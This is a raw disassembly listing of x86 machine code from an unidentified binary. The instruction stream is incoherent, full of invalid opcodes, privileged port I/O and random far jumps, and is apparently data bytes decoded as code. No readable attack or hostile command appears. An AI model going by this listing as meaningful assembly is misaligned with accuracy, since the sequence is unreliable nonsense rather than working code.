  421bad:	and    eax,0x3cd6f018
  421bb2:	dec    edx
  421bb3:	sub    esp,DWORD PTR [eax-0x1]
  421bb6:	rcr    DWORD PTR [eax+edx*1],cl
  421bb9:	jo     0x421c38
  421bbb:	push   ecx
  421bbc:	stos   DWORD PTR es:[edi],eax
  421bbd:	addr16 ss mov ebp,0x675fa075
  421bc4:	loop   0x421b4d
  421bc6:	mov    esp,0x93a5a6ee
  421bcb:	mov    ebp,0x2b308c6f
  421bd0:	add    ch,BYTE PTR [ecx-0x2a]
  421bd3:	fistp  WORD PTR [eax+ecx*4-0x4488624c]
  421bda:	mov    ?,edx
  421bdc:	mov    al,ds:0x323b08ae
  421be1:	pop    esi
  421be2:	adc    eax,0x142856df
  421be7:	xchg   edx,eax
  421be8:	sahf   
  421be9:	out    0x65,al
  421beb:	dec    esi
  421bec:	or     edx,DWORD PTR [edi]
  421bee:	rol    BYTE PTR ds:0x864576cb,cl
  421bf4:	aad    0x75
  421bf6:	sbb    al,0x6
  421bf8:	push   0xd542853a
  421bfd:	sbb    eax,0x78692b97
  421c02:	bound  ebx,QWORD PTR [edx+0x5e2fcab6]
  421c08:	xor    al,0xae
  421c0a:	into   
  421c0b:	outs   dx,DWORD PTR ds:[esi]
  421c0c:	mov    ebp,0xce431e48
  421c11:	adc    BYTE PTR [eax-0x7e],bl
  421c14:	outs   dx,BYTE PTR ds:[esi]
  421c15:	mov    eax,ds:0x98dc60c4
  421c1a:	cmp    al,0xc9
  421c1c:	sub    eax,0x51c390d2
  421c21:	out    dx,al
  421c22:	jns    0x421bd1
  421c24:	sub    DWORD PTR [ebx-0x17180d89],0xf4165e9f
  421c2e:	test   al,0x11
  421c30:	(bad)  
  421c31:	hlt    
  421c32:	push   edx
  421c33:	int    0xe
  421c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c36:	mov    edx,0x1c87bdc6
  421c3b:	popf   
  421c3c:	and    al,0x89
  421c3e:	mov    ebp,0x655cef66
  421c43:	jnp    0x421c09
  421c45:	dec    ebx
  421c46:	xor    ch,cl
  421c48:	inc    ebp
  421c49:	cmp    bl,BYTE PTR [eax]
  421c4b:	inc    ebp
  421c4c:	sub    ecx,DWORD PTR [ecx+0x5c]
  421c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c50:	and    esi,DWORD PTR [edi-0x413f6729]
  421c56:	mov    eax,DWORD PTR [ecx+0x4f]
  421c59:	sub    DWORD PTR [edi],0x838d64a5
  421c5f:	lds    eax,FWORD PTR [esi]
  421c61:	jecxz  0x421cba
  421c63:	les    ebx,FWORD PTR [edi]
  421c65:	sub    BYTE PTR [edx-0x6327955f],bh
  421c6b:	je     0x421c96
  421c6d:	arpl   WORD PTR [ecx+edi*8],bp
  421c70:	pop    ebx
  421c71:	rcr    DWORD PTR [ecx],cl
  421c73:	or     esi,ebp
  421c75:	out    0x47,eax
  421c77:	repz lds eax,FWORD PTR [edx-0x3b]
  421c7b:	and    DWORD PTR [eax+0x18b49884],ebx
  421c81:	sub    al,0x2f
  421c83:	das    
  421c84:	inc    esp
  421c85:	sub    eax,0x29941402
  421c8a:	or     esp,DWORD PTR [ecx]
  421c8c:	adc    al,0x49
  421c8e:	pop    ecx
  421c8f:	mov    eax,0xd7
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	add    al,0xf4
  421d02:	out    dx,eax
  421d03:	jl     0x421cc5
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	pop    edx
  421d0d:	push   ecx
  421d0e:	or     eax,DWORD PTR [ecx+edx*2-0x66]
  421d12:	and    DWORD PTR [edx-0x367516d9],ebx
  421d18:	fcmovnb st,st(7)
  421d1a:	fidiv  WORD PTR [ebp+0x64b162c9]
  421d20:	mov    ch,0xdb
  421d22:	fwait
  421d23:	cdq    
  421d24:	(bad)  
  421d25:	je     0x421cc0
  421d27:	dec    edi
  421d28:	jecxz  0x421d97
  421d2a:	cmc    
  421d2b:	ins    BYTE PTR es:[edi],dx
  421d2c:	loop   0x421cb8
  421d2e:	pusha  
  421d2f:	sbb    DWORD PTR [edx+0x225fcf7d],ecx
  421d35:	add    al,0x73
  421d37:	xor    esi,DWORD PTR [eax+ecx*8+0x7]
  421d3b:	mov    bl,0xdd
  421d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3e:	std    
  421d3f:	push   0x915a85d4
  421d44:	add    BYTE PTR [eax],dh
  421d46:	mov    eax,ds:0x148110cb
  421d4b:	dec    ecx
  421d4c:	in     al,dx
  421d4d:	mov    edi,0xb7c090ed
  421d52:	adc    eax,0xd6c90df5
  421d57:	sahf   
  421d58:	enter  0xff3e,0x9c
  421d5c:	lock cli 
  421d5e:	outs   dx,BYTE PTR ds:[esi]
  421d5f:	sbb    esp,DWORD PTR [ecx]
  421d61:	mov    esp,0xb7e5b25f
  421d66:	or     ecx,DWORD PTR [esi+0x64456695]
  421d6c:	mov    ebx,0xa8b9e507
  421d71:	test   BYTE PTR [edx+0x77],cl
  421d74:	add    ecx,DWORD PTR [ebx+0x4a]
  421d77:	mov    cl,0x5f
  421d79:	loope  0x421d81
  421d7b:	pop    eax
  421d7c:	mov    eax,ds:0xf16a2b48
  421d81:	xor    al,0x54
  421d83:	aad    0x88
  421d85:	xchg   esp,eax
  421d86:	cmp    ecx,edx
  421d88:	hlt    
  421d89:	ret    
  421d8a:	lods   eax,DWORD PTR ds:[esi]
  421d8b:	outs   dx,DWORD PTR ds:[esi]
  421d8c:	mov    ds:0x5583411a,al
  421d91:	push   ecx
  421d92:	and    cl,dl
  421d94:	cmp    al,BYTE PTR [ebp-0x39c6027a]
  421d9a:	cs ret 
  421d9c:	sbb    DWORD PTR [ecx],edx
  421d9e:	mov    ah,0x5e
  421da0:	ins    DWORD PTR es:[edi],dx
  421da1:	shl    BYTE PTR [ecx+0x14108e35],1
  421da7:	lock int3 
  421da9:	repz jbe 0x421e28
  421dac:	jne    0x421e01
  421dae:	cmp    ebx,DWORD PTR [edx+0x5a]
  421db1:	stc    
  421db2:	fimul  DWORD PTR [eax+0x563a0c75]
  421db8:	xor    BYTE PTR gs:[edx],dl
  421dbb:	cmc    
  421dbc:	ret    0xdca9
  421dbf:	push   ecx
  421dc0:	int3   
  421dc1:	cld    
  421dc2:	or     eax,0x9cc8bb98
  421dc7:	jbe    0x421dc2
  421dc9:	iret   
  421dca:	pushf  
  421dcb:	cmc    
  421dcc:	push   cs
  421dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dce:	dec    edi
  421dcf:	div    BYTE PTR [edx+0x59]
  421dd2:	push   ebp
  421dd3:	mov    ch,BYTE PTR [edi]
  421dd5:	adc    dh,dl
  421dd7:	sbb    eax,0x275d3fcf
  421ddc:	leave  
  421ddd:	and    DWORD PTR [esi-0xd8750d5],ebp
  421de3:	push   esi
  421de4:	aad    0x1
  421de6:	dec    ecx
  421de7:	sbb    al,0x4c
  421de9:	mov    esp,0x7411aa42
  421dee:	iret   
  421def:	ds stos DWORD PTR es:[edi],eax
  421df1:	push   0xffffffd6
  421df3:	std    
  421df4:	cmp    DWORD PTR [eax],0x4ccc7215
  421dfa:	mov    ch,0x6c
  421dfc:	pop    ebx
  421dfd:	lahf   
  421dfe:	xchg   ebx,eax
  421dff:	push   0xffffffbc
  421e01:	xor    eax,0x8f72cbb2
  421e06:	jno    0x421e7d
  421e08:	mov    al,0xc
  421e0a:	add    ch,dl
  421e0c:	scas   eax,DWORD PTR es:[edi]
  421e0d:	ins    DWORD PTR es:[edi],dx
  421e0e:	ins    BYTE PTR es:[edi],dx
  421e0f:	xchg   BYTE PTR [eax+eax*1+0x0],ah
	...
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	xchg   sp,dx
  421e83:	inc    esi
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0x74000001,al
  421e8d:	scas   eax,DWORD PTR es:[edi]
  421e8e:	outs   dx,BYTE PTR ds:[esi]
  421e8f:	test   eax,0xbfd201f
  421e94:	icebp  
  421e95:	fist   WORD PTR [edi]
  421e97:	pop    ebp
  421e98:	outs   dx,BYTE PTR ds:[esi]
  421e99:	fld    DWORD PTR [ebx]
  421e9b:	add    al,0x40
  421e9d:	cmp    cl,al
  421e9f:	fadd   DWORD PTR [ecx-0x52]
  421ea2:	mov    ds:0x2b1a5c45,al
  421ea7:	add    eax,0x86a14067
  421eac:	pop    eax
  421ead:	ret    0xdfaa
  421eb0:	in     al,dx
  421eb1:	not    BYTE PTR [edx]
  421eb3:	push   ds
  421eb4:	push   ds
  421eb5:	je     0x421efc
  421eb7:	mov    esp,0xcf4d73c8
  421ebc:	dec    ebp
  421ebd:	imul   eax,DWORD PTR [esi+0x3d24f5f2],0xfffffff1
  421ec4:	jnp    0x421e8b
  421ec6:	dec    esi
  421ec7:	nop
  421ec8:	frstor cs:[edx+ecx*2+0x66]
  421ecd:	push   cs
  421ece:	and    BYTE PTR [ebx+0x2818d964],0x2
  421ed5:	sbb    DWORD PTR [ecx-0x7f],ebp
  421ed8:	or     DWORD PTR [edx+0x28],ebp
  421edb:	add    BYTE PTR [edi+0x62497264],ch
  421ee1:	sub    ah,al
  421ee3:	cmp    dl,bl
  421ee5:	lods   al,BYTE PTR ds:[esi]
  421ee6:	pop    ebx
  421ee7:	fisubr DWORD PTR [edx+0x54]
  421eea:	(bad)  
  421eeb:	jbe    0x421e8f
  421eed:	mov    DWORD PTR [ebp-0x13],esp
  421ef0:	adc    edi,ebx
  421ef2:	aaa    
  421ef3:	jle    0x421f37
  421ef5:	int    0x3b
  421ef7:	mov    esp,0xd6a07ca2
  421efc:	gs jnp 0x421f5f
  421eff:	mov    ebx,DWORD PTR [ebx-0x6a]
  421f02:	sahf   
  421f03:	ds lock call 0xed30:0x9158a6ec
  421f0c:	dec    ebp
  421f0d:	test   al,0xb1
  421f0f:	mov    ebp,0x847f04c0
  421f14:	xchg   edx,eax
  421f15:	in     al,dx
  421f16:	aam    0xf0
  421f18:	mov    al,0x8b
  421f1a:	mov    esi,0x1b632b33
  421f1f:	stc    
  421f20:	inc    ebx
  421f21:	popf   
  421f22:	pop    ss
  421f23:	(bad)  
  421f24:	rol    BYTE PTR [edi-0x3452f407],1
  421f2a:	fiadd  WORD PTR [eax-0xd]
  421f2d:	jne    0x421f0d
  421f2f:	ins    DWORD PTR es:[edi],dx
  421f30:	jmp    0xe095:0xc27d3642
  421f37:	jl     0x421ec5
  421f39:	stos   BYTE PTR es:[edi],al
  421f3a:	add    eax,0x344030d3
  421f3f:	mov    ebp,0x2ff3278
  421f44:	int3   
  421f45:	test   BYTE PTR [edi-0x28],0x42
  421f49:	test   al,0xf3
  421f4b:	xlat   BYTE PTR ds:[ebx]
  421f4c:	daa    
  421f4d:	jb     0x421f9e
  421f4f:	(bad)  
  421f50:	sub    BYTE PTR [di-0x45a1],dl
  421f55:	xchg   esi,eax
  421f56:	jecxz  0x421f4b
  421f58:	aad    0xbb
  421f5a:	mov    eax,ds:0xfd530726
  421f5f:	jl     0x421f9e
  421f61:	adc    dl,BYTE PTR [esi-0x2]
  421f64:	and    eax,0x9d4e1365
  421f69:	mov    WORD PTR [ebp+0x6c9ba354],gs
  421f6f:	mov    ebx,0x3865c01f
  421f75:	xor    DWORD PTR [ebp+ebx*2+0x1d1f63f2],ebx
  421f7c:	pop    ss
  421f7d:	jmp    0x421fcc
  421f7f:	retf   
  421f80:	pop    ecx
  421f81:	mov    fs,WORD PTR [edx]
  421f83:	cmp    eax,0x364424d2
  421f88:	ins    BYTE PTR es:[edi],dx
  421f89:	jg     0x421fbc
  421f8b:	add    DWORD PTR [edx],edx
  421f8d:	or     esi,DWORD PTR [esi+0x51db]
	...
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 fwait
  422001:	pop    edx
  422002:	inc    ebp
  422003:	cmp    eax,0x16aca
  422008:	add    eax,0x82000001
  42200d:	shr    DWORD PTR [eax+0x62c7c6e8],1
  422013:	sbb    al,0x6a
  422015:	cmp    al,0xda
  422017:	cdq    
  422018:	dec    eax
  422019:	inc    ebx
  42201a:	fcomip st,st(0)
  42201c:	push   esp
  42201d:	sub    edx,DWORD PTR [eax-0x42]
  422020:	(bad)  
  422021:	push   esi
  422022:	hlt    
  422023:	xor    DWORD PTR [edx+0x66fc1f2f],ebx
  422029:	retf   
  42202a:	xor    BYTE PTR [ebp-0x735b7877],al
  422030:	call   0xc6bc49cb
  422035:	pop    ebp
  422036:	es mov dh,0xbf
  422039:	jp     0x422058
  42203b:	cs scas al,BYTE PTR es:[edi]
  42203d:	pusha  
  42203e:	repnz or esp,DWORD PTR [ecx+0x45]
  422042:	aam    0xfd
  422044:	out    dx,al
  422045:	cmp    dl,bh
  422047:	nop
  422048:	mov    ss,edi
  42204a:	xor    esp,esp
  42204c:	xor    eax,0x7880b991
  422051:	inc    ecx
  422052:	xchg   edi,eax
  422053:	push   es
  422054:	daa    
  422055:	sbb    BYTE PTR [ebx-0x4be85807],0x5d
  42205c:	jnp    0x42201e
  42205e:	and    DWORD PTR [ebp-0x46],ebp
  422061:	adc    BYTE PTR [eax-0x54cdbef8],dh
  422067:	cmp    dl,BYTE PTR [eax+0x47b2a0bb]
  42206d:	stos   DWORD PTR es:[edi],eax
  42206e:	into   
  42206f:	mov    fs,bp
  422072:	inc    esp
  422073:	mov    al,ds:0x89805589
  422078:	dec    esi
  422079:	aam    0x42
  42207b:	adc    bh,BYTE PTR [ebx]
  42207d:	push   ebx
  42207e:	aad    0x25
  422080:	cmp    BYTE PTR [ebp+0x3c],ah
  422083:	out    0xa0,eax
  422085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422086:	sbb    dh,0x2d
  422089:	xchg   DWORD PTR [ebx-0x5e],ecx
  42208c:	imul   ebp,DWORD PTR [ecx+0x20fae814],0xc20d1c07
  422096:	in     al,dx
  422097:	imul   eax,DWORD PTR [edx-0x78e2788a],0x547baef1
  4220a1:	dec    ebx
  4220a2:	getsec 
  4220a4:	dec    edx
  4220a5:	cmp    DWORD PTR [ebx+0xce03563],ecx
  4220ab:	sub    bh,cl
  4220ad:	retf   0x4f36
  4220b0:	xchg   ebx,eax
  4220b1:	fstp   DWORD PTR [esi+0x585e82e4]
  4220b7:	out    dx,al
  4220b8:	ss xor eax,0xd40357b6
  4220be:	and    dl,dl
  4220c0:	sar    eax,1
  4220c2:	add    ch,dh
  4220c4:	loope  0x4220e4
  4220c6:	test   al,0x98
  4220c8:	imul   esp,DWORD PTR [edx],0xffffffbc
  4220cb:	mov    ebp,edx
  4220cd:	or     eax,0x6938e801
  4220d2:	hlt    
  4220d3:	fcomp  DWORD PTR [esp+eiz*4+0x2c]
  4220d7:	rol    ebx,0xfb
  4220da:	lahf   
  4220db:	adc    ebx,DWORD PTR [eax+0x6f70c6c2]
  4220e1:	lock int 0xcd
  4220e4:	jmp    0xe0058c1a
  4220e9:	popf   
  4220ea:	and    DWORD PTR [ebx+0x1a49167c],ecx
  4220f0:	mov    eax,ds:0xc33989a8
  4220f5:	imul   edx,DWORD PTR [esi],0xdec358b
  4220fb:	mov    eax,ds:0x87678512
  422100:	or     BYTE PTR [esi],al
  422102:	inc    esp
  422103:	adc    dl,BYTE PTR [ebp+0x25c7867d]
  422109:	fcom   DWORD PTR [ebx+0x31a24e00]
  42210f:	pop    ss
  422110:	dec    edi
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    edi,DWORD PTR [ebp-0x42]
  422182:	dec    eax
  422183:	fmul   st,st(7)
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xa4000001
  42218d:	fwait
  42218e:	mov    WORD PTR [eax+0x3b],gs
  422191:	adc    DWORD PTR [ecx],ecx
  422193:	dec    ecx
  422194:	sub    BYTE PTR [edx],bl
  422196:	adc    eax,0xa7840221
  42219b:	cs repz push ss
  42219e:	jbe    0x4221b8
  4221a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221a1:	dec    BYTE PTR [edx-0x773a62f8]
  4221a7:	aas    
  4221a8:	or     eax,esi
  4221aa:	pop    ds
  4221ab:	in     eax,0x2e
  4221ad:	int    0x21
  4221af:	stos   BYTE PTR es:[edi],al
  4221b0:	aas    
  4221b1:	(bad)  
  4221b2:	dec    esi
  4221b3:	int3   
  4221b4:	mov    ebp,0xe5a37a89
  4221b9:	imul   esi,DWORD PTR [ebx-0x18bd287c],0x63df0442
  4221c3:	rol    DWORD PTR [ecx-0x15],cl
  4221c6:	cli    
  4221c7:	lock fbstp TBYTE PTR [ebx]
  4221ca:	iret   
  4221cb:	mov    al,0xaa
  4221cd:	push   edx
  4221ce:	aam    0x2d
  4221d0:	mov    WORD PTR [ecx],?
  4221d2:	fstp   DWORD PTR [eax+0x26a3cfc1]
  4221d8:	jp     0x42220a
  4221da:	enter  0xbf59,0xdd
  4221de:	pop    ebp
  4221df:	push   ss
  4221e0:	fisub  WORD PTR [esi+0xc20d703]
  4221e6:	add    eax,0xc0283ab5
  4221eb:	jge    0x422172
  4221ed:	popf   
  4221ee:	je     0x422173
  4221f0:	mov    ebp,0x5a5fc67b
  4221f5:	jg     0x4221e3
  4221f7:	call   0x203b5c7c
  4221fc:	push   edx
  4221fd:	addr16 das 
  4221ff:	jbe    0x4221f1
  422201:	xchg   edx,eax
  422202:	jp     0x42219a
  422204:	dec    ebp
  422205:	sahf   
  422206:	mov    ch,0x1f
  422208:	fist   WORD PTR [edx+0x24]
  42220b:	shr    DWORD PTR [edi],cl
  42220d:	inc    esi
  42220e:	pop    ebp
  42220f:	mov    fs,WORD PTR [edi]
  422211:	inc    ecx
  422212:	push   0x45
  422214:	nop
  422215:	fisub  DWORD PTR [edi+0x7d]
  422218:	adc    eax,ebp
  42221a:	outs   dx,BYTE PTR ds:[esi]
  42221b:	mov    esp,0x188732b0
  422220:	xor    ecx,DWORD PTR [ecx-0x380bea47]
  422226:	mov    ds:0x2633f512,eax
  42222b:	adc    WORD PTR [edi+ebp*1-0x6c],bx
  422230:	or     DWORD PTR [edx+0x4b],edi
  422233:	scas   eax,DWORD PTR es:[edi]
  422234:	sub    ebx,DWORD PTR [ecx]
  422236:	mov    esi,0xf5964e7c
  42223b:	call   0x6b33cc68
  422240:	push   esp
  422241:	add    eax,0xb2bd8fab
  422246:	xor    dh,BYTE PTR [edi+0x47]
  422249:	pushf  
  42224a:	mov    bl,0xa7
  42224c:	dec    edx
  42224d:	xchg   BYTE PTR [ebx+0x22],ah
  422250:	retf   0xa3d0
  422253:	push   edx
  422254:	xchg   ebp,eax
  422255:	inc    ebx
  422256:	shl    DWORD PTR [ecx+0x63],cl
  422259:	xchg   ebp,eax
  42225a:	xor    dh,ch
  42225c:	int3   
  42225d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42225e:	jl     0x4221ee
  422260:	sbb    bh,BYTE PTR [ebp+eax*4-0x73df97f3]
  422267:	fidiv  DWORD PTR [eax-0x6f0f2b39]
  42226d:	inc    ebx
  42226e:	push   eax
  42226f:	jmp    0x27c8:0xce0a94c8
  422276:	sbb    DWORD PTR [esi-0x36],0xc062aaa4
  42227d:	push   0x758b995d
  422282:	pop    esp
  422283:	sub    al,0xb7
  422285:	ret    
  422286:	adc    dh,BYTE PTR [esi-0x18]
  422289:	ds test eax,0x5e174d7c
  42228f:	test   eax,0x5c
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	push   ds
  422301:	outs   dx,DWORD PTR ds:[esi]
  422302:	inc    edx
  422303:	ja     0x4222d9
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x12000001
  42230d:	push   es
  42230e:	add    al,0x51
  422310:	xchg   DWORD PTR [esi+0x8],edi
  422313:	adc    al,0x8c
  422315:	mov    WORD PTR [ebx+ebp*8],fs
  422318:	in     al,dx
  422319:	push   dx
  42231b:	push   edi
  42231c:	scas   al,BYTE PTR es:[edi]
  42231d:	inc    eax
  42231e:	stc    
  42231f:	push   es
  422320:	clc    
  422321:	loope  0x42238c
  422323:	xor    ebx,edx
  422325:	mov    ah,BYTE PTR [ebx+0x44]
  422328:	inc    esi
  422329:	sub    eax,0x7746a139
  42232e:	dec    edx
  42232f:	sti    
  422330:	pusha  
  422331:	mov    ds:0xd38d4195,eax
  422336:	icebp  
  422337:	xor    ch,BYTE PTR [ecx]
  422339:	pop    esp
  42233a:	es mov al,0xdc
  42233d:	or     al,0xe8
  42233f:	mov    bl,0x95
  422341:	pusha  
  422342:	push   ds
  422343:	add    eax,0xb7d4721c
  422348:	pusha  
  422349:	out    0x32,al
  42234b:	mov    ch,0x6b
  42234d:	mov    ebp,0xa7999f0
  422352:	rcr    BYTE PTR [ebx+0x55],cl
  422355:	cli    
  422356:	xchg   BYTE PTR [eax+0x745158eb],dl
  42235c:	mov    ebx,0x734f0efe
  422361:	gs scas al,BYTE PTR es:[edi]
  422363:	jl     0x42232f
  422365:	adc    al,0x85
  422367:	aaa    
  422368:	test   BYTE PTR [edx],al
  42236a:	pop    ebp
  42236b:	inc    ecx
  42236c:	jmp    0x42234c
  42236e:	xor    BYTE PTR [eax-0x3bc7939b],cl
  422374:	test   eax,0xd6ec13dc
  422379:	ds dec edi
  42237b:	in     al,0xd
  42237d:	pop    ds
  42237e:	xor    BYTE PTR ds:0xb5315cd3,ah
  422384:	ss push eax
  422386:	sub    edi,edx
  422388:	xor    al,0xbe
  42238a:	cdq    
  42238b:	push   ebx
  42238c:	and    BYTE PTR [eax+0x3430fc3f],al
  422392:	fdiv   st(4),st
  422394:	outs   dx,DWORD PTR ds:[esi]
  422395:	shl    esp,0x65
  422398:	fsub   st(7),st
  42239a:	pusha  
  42239b:	loope  0x4223cb
  42239d:	fidiv  WORD PTR [bp+di-0x5ad3]
  4223a2:	add    bh,ah
  4223a4:	pop    esp
  4223a5:	ror    cl,0xa5
  4223a8:	inc    ebp
  4223a9:	in     eax,dx
  4223aa:	popa   
  4223ab:	mov    edi,fs
  4223ad:	push   0x18
  4223af:	pop    ebx
  4223b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b1:	scas   al,BYTE PTR es:[edi]
  4223b2:	add    eax,0xbc46c8a6
  4223b7:	enter  0xd9d3,0xc0
  4223bb:	mov    BYTE PTR [eax+0x18],al
  4223be:	fld    TBYTE PTR [edx-0x5f20557d]
  4223c4:	stos   DWORD PTR es:[edi],eax
  4223c5:	adc    edx,DWORD PTR [esi+0x1a]
  4223c8:	(bad)  
  4223ca:	jno    0x42239a
  4223cc:	mov    ds:0x33f6c205,al
  4223d1:	jg     0x4223d2
  4223d3:	xor    DWORD PTR [edx],0xf21b120f
  4223d9:	push   0x9a74611d
  4223de:	ds pop ax
  4223e1:	arpl   WORD PTR [edi],bx
  4223e3:	fbld   TBYTE PTR [edx+0x67]
  4223e6:	adc    esi,DWORD PTR [ecx+0x7a7f9c3d]
  4223ec:	lods   al,BYTE PTR ds:[esi]
  4223ed:	add    BYTE PTR [eax],ah
  4223ef:	xlat   BYTE PTR ds:[ebx]
  4223f0:	loope  0x4223d1
  4223f2:	mov    eax,0xfa3f74cb
  4223f7:	sub    esi,ebx
  4223f9:	sbb    DWORD PTR [edx+0x2778bd69],edx
  4223ff:	push   ebp
  422400:	mov    ch,BYTE PTR ds:0x9276788b
  422406:	mov    ecx,0x51ee34f8
  42240b:	ret    0x45da
  42240e:	inc    eax
  42240f:	sub    ebp,edi
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	bound  esi,QWORD PTR [edx]
  422482:	add    ebp,DWORD PTR [ecx+0x16dd9]
  422488:	add    eax,0x69000001
  42248d:	addr16 dec ecx
  42248f:	mov    bl,0xca
  422491:	xchg   ebx,eax
  422492:	and    al,0x13
  422494:	out    0x32,al
  422496:	pop    eax
  422497:	call   DWORD PTR [ecx*8-0x4c5f8a15]
  42249e:	js     0x4224b6
  4224a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224a1:	add    eax,0xfda506c7
  4224a6:	call   FWORD PTR [edx+0x16]
  4224a9:	call   0xb2e4c2cf
  4224ae:	push   0xffffff8e
  4224b0:	call   0x78aa8ac7
  4224b5:	sub    al,0x4
  4224b7:	cmp    eax,0x746efaa1
  4224bc:	iret   
  4224bd:	push   esp
  4224be:	das    
  4224bf:	aaa    
  4224c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224c1:	(bad)  
  4224c2:	mov    bh,0xb8
  4224c4:	inc    eax
  4224c5:	mov    esi,0x7df87d48
  4224ca:	or     ebp,DWORD PTR [ebx+0x26776e9a]
  4224d0:	shl    bh,1
  4224d2:	cmp    edx,DWORD PTR [eax-0x3ecf0a67]
  4224d8:	xor    eax,0xccbc3de9
  4224dd:	push   esp
  4224de:	and    al,0x85
  4224e0:	int3   
  4224e1:	mov    eax,0xa67b2914
  4224e6:	mov    al,ds:0xeab494c6
  4224eb:	sub    bh,BYTE PTR [edx+0x10]
  4224ee:	push   esi
  4224ef:	jmp    0xadc0:0xeb7ff1a4
  4224f6:	lods   eax,DWORD PTR ds:[esi]
  4224f7:	daa    
  4224f8:	pop    ds
  4224f9:	(bad)  
  4224fa:	call   0xb3e:0x3a16ceb0
  422501:	test   dh,dl
  422503:	pop    ecx
  422504:	xchg   ebx,eax
  422505:	sar    BYTE PTR [esi],cl
  422507:	adc    ch,al
  422509:	or     BYTE PTR ds:0x79e08a2c,ch
  42250f:	mov    ch,0x87
  422511:	scas   eax,DWORD PTR es:[edi]
  422512:	push   0xbe13c2c4
  422517:	arpl   WORD PTR [esi],di
  422519:	and    eax,0x5635429a
  42251e:	(bad)  
  42251f:	pop    ds
  422520:	stc    
  422521:	in     eax,dx
  422522:	mov    edi,0x6b5c9e43
  422527:	cs inc ebp
  422529:	addr16 int3 
  42252b:	push   ecx
  42252c:	push   cs
  42252d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42252e:	fcom   DWORD PTR [edx+0x158393e0]
  422534:	aas    
  422535:	sub    ecx,DWORD PTR [edx+0x3d5f1636]
  42253b:	add    BYTE PTR [edi-0x4c],cl
  42253e:	push   eax
  42253f:	push   ds
  422540:	jno    0x422535
  422542:	and    edx,DWORD PTR [esi]
  422544:	xor    eax,0x81ef1ba5
  422549:	je     0x422510
  42254b:	mov    cl,0x97
  42254d:	xlat   BYTE PTR ds:[ebx]
  42254e:	add    eax,0x41538fa7
  422553:	inc    ecx
  422554:	arpl   si,cx
  422556:	jl     0x4225d4
  422558:	mov    ebx,0xe3874cbc
  42255d:	xor    al,dl
  42255f:	or     eax,0x850a3e35
  422564:	int    0xbb
  422566:	add    bh,BYTE PTR [eax]
  422568:	in     al,dx
  422569:	dec    esp
  42256a:	mov    cl,0xb0
  42256c:	dec    esi
  42256d:	mov    dh,0xf
  42256f:	nop
  422570:	test   ebx,ebx
  422572:	mov    bh,bl
  422574:	pop    esi
  422575:	pop    esi
  422576:	aaa    
  422577:	data16 mov al,0x54
  42257a:	mov    bl,0x17
  42257c:	inc    esp
  42257d:	cmp    al,0x7a
  42257f:	sar    DWORD PTR [eax],1
  422581:	jl     0x4225c1
  422583:	shr    BYTE PTR [edi],1
  422585:	repnz in al,dx
  422587:	pop    ss
  422588:	orps   xmm7,xmm4
  42258b:	lods   eax,DWORD PTR ds:[esi]
  42258c:	xor    eax,DWORD PTR [edi]
  42258e:	add    eax,0xf6bc
	...
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x35885d08]
  422602:	lahf   
  422603:	sub    ebx,esi
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    eax,0x5e000001
  42260d:	or     BYTE PTR [ebx+0x7e],bl
  422610:	jecxz  0x422651
  422612:	push   ebp
  422613:	push   esp
  422614:	out    dx,al
  422615:	arpl   WORD PTR [ecx+0x26fe4621],cx
  42261b:	(bad)  
  42261c:	xchg   edi,eax
  42261d:	jbe    0x4225c2
  42261f:	imul   ecx,DWORD PTR [edi+0x5baf198b],0x8c01540f
  422629:	mov    ebp,0xcd087983
  42262e:	jmp    0xf953:0xbab723f3
  422635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422636:	out    dx,al
  422637:	add    BYTE PTR [eax+0x538c04e6],ah
  42263d:	pop    edx
  42263e:	sbb    al,0x7f
